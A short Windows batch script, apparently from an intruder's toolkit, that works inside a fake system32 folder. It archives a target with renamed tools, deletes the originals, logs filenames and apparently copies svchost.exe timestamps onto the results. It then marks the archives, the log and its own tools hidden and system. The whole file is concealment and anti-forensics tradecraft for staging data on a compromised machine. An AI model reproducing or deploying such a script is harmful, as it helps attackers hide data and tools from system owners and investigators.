@echo off
cd %systemdrive%
cd "%systemroot%\system32\TcpIpSVC\restore_3\ARPLOAD\"
cd "%systemroot%\system32\TcpIpSVC\restore_3\ARPLOAD\"
echo ** STARTING TO TAR VIA ELITENESS **
attrib +a -h -s dll.*
attrib +a -h -s appmgnt.*
appmgnt.exe --remove-files -cf EWG-%1.tar %1
echo %1 >> SYSTEM.DB
move %1 elite.%1
#dll.exe EWG-%1.tar
#dll.exe elite.%1
#dll.exe SYSTEM.DB
dll.exe /m:%systemroot%\system32\svchost.exe EWG-%1.rar
dll.exe /m:%systemroot%\system32\svchost.exe elite.%1
dll.exe /m:%systemroot%\system32\svchost.exe SYSTEM.DB
attrib +a +h +s elite.%1
attrib +a +h -s EWG-%1.tar
attrib +a +h -s -r EWG-%1.tar
attrib +a +h -s SYSTEM.DB
attrib +a +h -s -r SYSTEM.DB
attrib +a +h +s dll.*
attrib +a +h +s appmgnt.*
echo ** ALL TARRING DONE **